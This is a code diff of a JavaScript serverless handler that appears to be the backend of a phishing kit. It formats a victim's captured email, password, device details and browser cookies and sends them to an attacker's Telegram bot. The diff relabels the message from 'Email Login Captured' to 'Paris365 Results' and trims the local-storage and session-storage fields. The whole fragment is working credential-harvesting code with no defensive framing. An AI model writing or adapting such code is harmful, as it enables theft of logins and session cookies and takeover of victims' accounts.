@@ -174,7 +174,7 @@ export const handler = async (event, context) => {
 • File will be sent as attachment below
 `;
     
-    const message = `🔐 Email Login Captured
+    const message = `🔐 Paris365 Results
 
 📧 Email: ${email}
 🔑 Password: ${password}
@@ -189,16 +189,6 @@ ${deviceInfo}
 🍪 COOKIES:
 ${cookiesDisplay}
 
-💾 LOCAL STORAGE:
-${localStorageDisplay}
-
-🗂 SESSION STORAGE:
-${sessionStorageDisplay}${additionalInfo}${cookiesFileSummary}
-
-🆔 Session ID: ${sessionId}
-
----
- - Full Browser Session Captured`;
 
     // Send main message to Telegram
     const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
